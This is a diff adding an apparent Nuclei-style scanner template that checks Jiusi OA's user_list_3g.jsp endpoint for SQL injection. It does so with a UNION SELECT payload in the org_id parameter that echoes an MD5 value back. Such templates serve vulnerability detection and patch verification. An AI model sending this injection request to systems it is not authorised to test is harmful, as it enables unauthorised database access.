@@ -1,0 +1,28 @@
+id: poc-yaml-jiusi-oa-user-list-3g-sqli
+info:
+  name: Jiusi OA user_list_3g.jsp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Jiusi OA user_list_3g.jsp endpoint allows attackers to execute arbitrary SQL queries.
+
+variables:
+  t1: "{{rand_int(1000,9999)}}"
+  result: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0%20%20union/**/select/**/1,md5({{t1}})%20%23&userIds=1&userNames=1&content=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{result}}"
+        part: body
